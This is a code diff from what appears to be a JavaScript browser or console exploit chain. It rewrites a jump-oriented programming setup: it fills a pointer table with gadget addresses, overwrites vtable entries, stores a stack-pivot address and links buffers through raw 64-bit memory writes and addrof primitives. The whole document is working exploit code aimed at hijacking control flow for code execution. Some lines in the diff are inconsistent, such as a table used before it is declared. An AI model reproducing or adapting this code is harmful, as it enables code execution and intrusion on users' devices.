@@ -242,23 +242,31 @@ export function init(Chain) {
         this.vtable = vtable;
         this.old_vtable_p = old_vtable_p;
 
-      
-        rax_ptrs.write64(vtable, 0x1b8, this.get_gadget(ta_jop1));
-       rax_ptrs.write64(vtable, 0xb8, this.get_gadget(ta_jop2));
-        rax_ptrs.write64(vtable, 0x1c, this.get_gadget(ta_jop3));
+        rw.write64(vtable, 0x1b8, this.get_gadget(ta_jop1));
+        rw.write64(vtable, 0xb8, this.get_gadget(ta_jop2));
+        rw.write64(vtable, 0x1c, this.get_gadget(ta_jop3));
     
-    // JOP table
-    const rax_ptrs = new BufferView(0x100);
-    const rax_ptrs_p = get_view_vector(rax_ptrs);
-    proto._rax_ptrs = rax_ptrs;
+    // for the JOP chain
+        const rax_ptrs = new Uint8Array(0x100);
+        const rax_ptrs_p = get_view_vector(rax_ptrs);
+        this.rax_ptrs = rax_ptrs;
 
-    rax_ptrs.write64(0x80, get_gadget(gadgets, jop2));
-    rax_ptrs.write64(0x58, get_gadget(gadgets, jop3));
-    rax_ptrs.write64(0x10, get_gadget(gadgets, jop4));
-    rax_ptrs.write64(0, get_gadget(gadgets, jop5));
+        //rw.write64(rax_ptrs, 8, this.get_gadget(jop2));
+        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop2));
+        rw.write64(rax_ptrs, 0x58, this.get_gadget(jop3));
+        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop4));
+        rw.write64(rax_ptrs, 0, this.get_gadget(jop5));
+        // value to pivot rsp to
+        rw.write64(this.rax_ptrs, 0x18, this.stack_addr);
 
-    const jop_buffer_p = mem.addrof(_rop).readp(off.js_butterfly);
-    jop_buffer_p.write64(0, rax_ptrs_p);
+        const jop_buffer = new Uint8Array(8);
+        const jop_buffer_p = get_view_vector(jop_buffer);
+        this.jop_buffer = jop_buffer;
+
+        rw.write64(jop_buffer, 0, rax_ptrs_p);
+
+        rw.write64(vtable, 8, jop_buffer_p);
+
 
     const empty = {};
     proto._empty_cell = mem.addrof(empty).read64(off.js_cell);
